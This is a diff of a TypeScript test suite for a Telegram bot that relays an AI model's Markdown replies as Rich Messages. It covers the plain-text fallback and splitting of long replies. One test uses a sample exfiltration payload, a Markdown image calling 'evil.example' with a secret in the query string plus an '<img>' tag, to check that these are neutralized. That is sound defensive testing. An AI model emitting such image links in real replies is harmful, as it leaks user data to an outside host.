@@ -27,13 +27,14 @@ let telegramIds = 5_000;
 interface Sent {
   chatId: number;
   text: string;
-  parseMode?: string;
+  /** Sent as a Rich Message rather than plain text. */
+  rich?: boolean;
 }
 
 /**
  * A linked user, a scripted model and a fake Telegram, all rolled back
- * afterwards. With `rejectMarkup`, the fake rejects HTML like Telegram does
- * for markup it can't parse.
+ * afterwards. With `rejectRich`, the fake rejects Rich Messages, to exercise
+ * the plain-text fallback.
  */
 async function scenario(
   replies: Record<string, unknown>[][],
@@ -47,7 +48,7 @@ async function scenario(
     typing: { sends: number; running: boolean };
   }) => Promise<void>,
   options: {
-    rejectMarkup?: boolean;
+    rejectRich?: boolean;
     /** Runs while model request `index` of a turn is in flight. */
     onRequest?: (
       index: number,
@@ -62,26 +63,17 @@ async function scenario(
       .values({ userId: user.id, chatId: 42, telegramUserId: 42 });
     const sent: Sent[] = [];
     const telegram = {
-      sendMessage: (
-        chatId: number,
-        text: string,
-        sendOptions?: { parse_mode?: "HTML" },
-      ) => {
-        if (options.rejectMarkup && sendOptions?.parse_mode)
+      sendMessage: (chatId: number, text: string) => {
+        sent.push({ chatId, text });
+        telegramIds += 1;
+        return Promise.resolve({ message_id: telegramIds });
+      },
+      sendRichMessage: (chatId: number, markdown: string) => {
+        if (options.rejectRich)
           return Promise.reject(
-            Object.assign(new Error("Call to 'sendMessage' failed!"), {
-              error_code: 400,
-              description:
-                "Bad Request: can't parse entities: Unsupported start tag",
-            }),
+            new Error("Bad Request: rich message rejected"),
           );
-        sent.push({
-          chatId,
-          text,
-          ...(sendOptions?.parse_mode
-            ? { parseMode: sendOptions.parse_mode }
-            : {}),
-        });
+        sent.push({ chatId, text: markdown, rich: true });
         telegramIds += 1;
         return Promise.resolve({ message_id: telegramIds });
       },
@@ -152,9 +144,7 @@ describe("runFrontTurn", () => {
         const runId = await turn();
         if (!runId) throw new Error("expected a run");
 
-        expect(sent).toEqual([
-          { chatId: 42, text: "Morning.", parseMode: "HTML" },
-        ]);
+        expect(sent).toEqual([{ chatId: 42, text: "Morning.", rich: true }]);
         const [outbound] = await tx
           .select()
           .from(outboundMessages)
@@ -170,46 +160,63 @@ describe("runFrontTurn", () => {
     );
   });
 
-  test("Markdown reaches Telegram as HTML, and the outbound row keeps what the model wrote", async () => {
+  test("the model's Markdown reaches Telegram untouched, as a Rich Message", async () => {
+    const markdown =
+      "**Dana** moved to 4.\n\n- bring the deck\n\n| a | b |\n| - | - |\n| 1 | 2 |";
     await scenario(
-      [[textReply("**Dana** moved to 4. Notes: https://example.com")]],
+      [[textReply(markdown)]],
       async ({ tx, userId, say, turn, sent }) => {
         await say("what changed?");
+        await turn();
+        expect(sent).toEqual([{ chatId: 42, text: markdown, rich: true }]);
+        const [outbound] = await tx
+          .select()
+          .from(outboundMessages)
+          .where(eq(outboundMessages.userId, userId));
+        expect(outbound?.text).toBe(markdown);
+      },
+    );
+  });
+
+  test("images and HTML are neutralized before sending; the record keeps the original", async () => {
+    const markdown = "Done. ![x](https://evil.example/?d=secret) <img src=x>";
+    await scenario(
+      [[textReply(markdown)]],
+      async ({ tx, userId, say, turn, sent }) => {
+        await say("hi");
         await turn();
         expect(sent).toEqual([
           {
             chatId: 42,
-            text: '<b>Dana</b> moved to 4. Notes: <a href="https://example.com">https://example.com</a>',
-            parseMode: "HTML",
+            text: "Done. [x](https://evil.example/?d=secret) &lt;img src=x>",
+            rich: true,
           },
         ]);
         const [outbound] = await tx
           .select()
           .from(outboundMessages)
           .where(eq(outboundMessages.userId, userId));
-        expect(outbound?.text).toBe(
-          "**Dana** moved to 4. Notes: https://example.com",
-        );
+        expect(outbound?.text).toBe(markdown);
       },
     );
   });
 
-  test("markup Telegram rejects is re-sent as plain text", async () => {
+  test("a Rich Message Telegram rejects is re-sent as plain text", async () => {
     await scenario(
       [[textReply("**Dana** moved to 4.")]],
       async ({ say, turn, sent }) => {
         await say("what changed?");
         await turn();
-        expect(sent).toEqual([{ chatId: 42, text: "Dana moved to 4." }]);
+        expect(sent).toEqual([{ chatId: 42, text: "**Dana** moved to 4." }]);
       },
-      { rejectMarkup: true },
+      { rejectRich: true },
     );
   });
 
-  test("a long reply goes out as several messages, recorded on one row", async () => {
+  test("a reply past the Rich Message limit goes out as several, recorded on one row", async () => {
     const long = Array.from(
       { length: 3 },
-      (_, i) => `Paragraph ${String(i + 1)}. ${"word ".repeat(500).trim()}`,
+      (_, i) => `Paragraph ${String(i + 1)}. ${"word ".repeat(2500).trim()}`,
     ).join("\n\n");
     await scenario(
       [[textReply(long)]],
@@ -218,7 +225,7 @@ describe("runFrontTurn", () => {
         await turn();
         expect(sent.length).toBeGreaterThan(1);
         for (const message of sent)
-          expect(message.text.length).toBeLessThanOrEqual(4096);
+          expect(message.text.length).toBeLessThanOrEqual(32_768);
         const [outbound] = await tx
           .select()
           .from(outboundMessages)
@@ -385,9 +392,7 @@ describe("runFrontTurn", () => {
         await say("capital of Portugal?");
         const runId = await turn();
         if (!runId) throw new Error("expected a run");
-        expect(sent).toEqual([
-          { chatId: 42, text: "Lisbon.", parseMode: "HTML" },
-        ]);
+        expect(sent).toEqual([{ chatId: 42, text: "Lisbon.", rich: true }]);
         const rows = await tx
           .select()
           .from(runMessages)
